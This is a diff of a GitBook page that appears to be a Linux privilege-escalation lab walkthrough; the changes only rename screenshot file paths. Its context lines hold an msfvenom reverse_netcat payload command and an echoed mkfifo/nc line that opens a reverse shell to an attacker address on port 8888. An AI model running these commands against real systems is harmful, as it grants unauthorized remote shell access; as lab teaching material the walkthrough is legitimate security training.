@@ -106,7 +106,7 @@ Password: password
 sudo -l
 ```
 
-<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (6).png" alt=""><figcaption></figcaption></figure>
 
 **Victim**
 
@@ -133,7 +133,7 @@ Password: password
 msfvenom -p cmd/unix/reverse_netcat lhost=$KALI lport=8888 R
 ```
 
-<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (2).png" alt=""><figcaption></figcaption></figure>
 
 **Kali**
 
@@ -159,7 +159,7 @@ echo 'mkfifo /tmp/cibykaz; nc 10.10.185.2 8888 0</tmp/cibykaz | /bin/sh >/tmp/ci
 
 Wait for the script to run and catch the shell on Kali.
 
-<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Exploiting PATH Variable
 
